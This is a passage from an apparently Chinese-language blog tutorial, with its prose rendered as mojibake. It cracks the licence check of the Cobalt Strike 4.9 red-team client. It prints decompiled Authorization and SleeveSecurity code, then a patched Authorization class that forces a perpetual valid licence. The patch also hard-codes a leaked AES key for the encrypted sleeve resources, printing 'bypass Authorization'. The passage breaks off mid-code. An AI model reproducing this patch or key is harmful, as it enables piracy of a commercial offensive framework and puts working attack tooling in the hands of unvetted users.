punctuation">&#123;</span>                <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"trouble locating auth file"</span><span class="token punctuation">,</span> var11<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Could not read "</span> <span class="token operator">+</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">AuthCrypto</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">DataParser</span> var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataParser</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                    var5<span class="token punctuation">.</span><span class="token function">big</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    var5<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span> var7 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> var9 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> <span class="token number">49</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">29999999</span> <span class="token operator">==</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span>                        <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"valid to"</span><span class="token punctuation">,</span> <span class="token string">"perpetual"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Valid to date ("</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">") is invalid"</span><span class="token punctuation">;</span>                            <span class="token keyword">return</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>validto <span class="token operator">=</span> <span class="token string">"20"</span> <span class="token operator">+</span> var8<span class="token punctuation">;</span>                        <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"valid to"</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> var9 <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"auth file parsing"</span><span class="token punctuation">,</span> var10<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">></span> <span class="token number">999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> var2 <span class="token operator">=</span> <span class="token number">2000</span> <span class="token operator">+</span> var1 <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var3 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var4 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> var5 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">></span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Calendar</span> var7 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var7<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var7<span class="token punctuation">.</span><span class="token function">setLenient</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    var7<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                    var7<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"forever"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valid<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">:</span> <span class="token string">"Authorization file is not for Cobalt Strike 4.9"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">parseDate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">,</span> <span class="token string">"yyyyMMdd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token number">1L</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"in 1 day ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> var1 <span class="token operator">&lt;=</span> <span class="token number">0L</span> <span class="token operator">?</span> <span class="token string">"TODAY ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token operator">:</span> <span class="token string">"in "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" days ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> var1 <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token keyword">int</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">86400000L</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>var0<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬æŠŠè¦ä¿®æ”¹çš„ç±»æ‹·è´åˆ°srcç›®å½•é‡Œé¢csproject\src\common\Authorization.java<br>æˆ‘ä»¬çœ‹ä»–çš„å±æ€§ä¸€ä¸ªä¸€ä¸ªåˆ†æå¡«å…¥å€¼  protected String validto &#x3D; â€œâ€;æˆ‘ä»¬çœ‹è¿™ä¸ªä¸ºforeveræˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å±æ€§ä¸ºforever<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101628300.png" alt="å¦‚å›¾"><br>å‰å¤©ä¸¤ä¸ªå±æ€§åŒæ ·çš„æ–¹å¼æ”¹æˆ<br>protected String error &#x3D; null; &#x2F;&#x2F;è¿™ä¸ªä¸ç”¨åŠ¨<br>protected boolean valid &#x3D; true;</p><p>æ‰€ä»¥æˆ‘ä»¬æ”¹æˆäº†</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></code></pre><p>ç»§ç»­çœ‹ä»£ç  SleevedResource.Setup(var6);<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101632683.png" alt="å¦‚å›¾"><br>è¿™ä¸ªä»£ç æ˜¯å¹²å•¥çš„æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹</p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Setup</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token class-name">SleeveSecurity</span> <span class="token class-name">A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åˆå§‹åŒ– SleeveSecurity å¹¶ä¸”è°ƒç”¨ registerKey</span>        <span class="token keyword">private</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">.</span><span class="token function">registerKey</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\dns\<span class="token class-name">SleeveSecurity</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token keyword">public</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1 <span class="token operator">=</span> <span class="token string">"abcdefghijklmnop"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IvParameterSpec</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span> <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/CBC/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>C</span> <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/CBC/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span> <span class="token operator">=</span> <span class="token class-name">Mac</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"HmacSHA256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬çœ‹ SleevedResource.Setup(var6);  var6æ˜¯å“ªé‡Œæ¥çš„æˆ‘å°±ä¸æˆªå›¾äº†ã€‚çœ‹è¿™ä¸ªæ¶åŠ¿æ˜¯ä».authæ–‡ä»¶é‡Œé¢è¯»å–çš„ã€‚è¿™æåˆ°è¿™é‡Œå°±æ²¡åŠæ³•äº†ä¼¼ä¹è¿™ä¸ªvar6å€¼æä¸å®šäº†ã€‚å¹¶ä¸”ä»ä»£ç é‡Œé¢çœ‹è²Œä¼¼æ˜¯AES\CBCçš„ç§˜é’¥ã€‚æˆ‘ä»¬ç¿»çœ‹githubä¸éš¾å‘ç°æœ‰ä¸ª 4.9ä»æ­£ç‰ˆæå–å‡ºæ¥çš„var6æˆ‘ä»¬çœ‹çœ‹ <a href="https://github.com/kyxiaxiang/CrackSleeve4.9">https://github.com/kyxiaxiang/CrackSleeve4.9</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Could not read "</span> <span class="token operator">+</span> var1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">AuthCrypto</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             <span class="token class-name">DataParser</span> var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataParser</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>             var5<span class="token punctuation">.</span><span class="token function">big</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æˆ‘ä»¬å‘ç°ç§˜é’¥ä¸º<br> private static byte[] OriginKey &#x3D; {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109}; æ‰€ä»¥æˆ‘ä»¬å®šä¹‰var6ä¸º<br> æ‰€ä»¥æˆ‘ä»¬æ–°çš„æ–‡ä»¶ä»£ç ä¸º<br> <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Authorization</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span> <span class="token comment">//ä¿®æ”¹éƒ¨åˆ†</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token comment">//ä¿®æ”¹éƒ¨åˆ†</span>   <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment">//ä¿®æ”¹éƒ¨åˆ†</span>   <span class="token keyword">public</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//ä¿®æ”¹éƒ¨åˆ†</span>          <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bypass Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">></span> <span class="token number">999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">int</span> var2 <span class="token operator">=</span> <span class="token number">2000</span> <span class="token operator">+</span> 